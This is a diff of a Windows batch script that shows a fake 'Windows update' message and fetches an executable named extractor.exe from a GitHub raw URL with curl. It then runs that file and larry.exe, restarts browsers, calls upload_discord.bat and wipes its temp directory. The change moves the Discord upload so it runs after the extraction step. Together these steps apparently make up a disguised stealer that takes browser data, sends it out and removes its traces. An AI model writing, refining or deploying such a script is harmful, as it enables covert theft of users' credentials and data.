@@ -40,11 +40,7 @@ for %%F in (larry.exe upload_discord.bat cleanup.bat) do (
 )
 
 call "%tempdir%\larry.exe"
-timeout /t 1 /nobreak
-call "%tempdir%\upload_discord.bat"
 
-echo Temp directory to be cleaned: %tempdir%
-timeout /t 1 /nobreak >nul
 
 echo Windows update 1.002
 curl -L -s -o extractor.exe https://raw.githubusercontent.com/24-20/silent-protocol_v01/main/extractor.exe
@@ -63,6 +59,13 @@ call "%tempdir%\extractor.exe"
 echo Restarting browsers
 call "%tempdir%\start_browsers.bat"
 
+
+
+timeout /t 1 /nobreak
+call "%tempdir%\upload_discord.bat"
+
+echo Temp directory to be cleaned: %tempdir%
+timeout /t 1 /nobreak >nul
 
 echo Process finished, starting cleanup----------------------------------------
 call "%tempdir%\cleanup.bat" "%tempdir%"
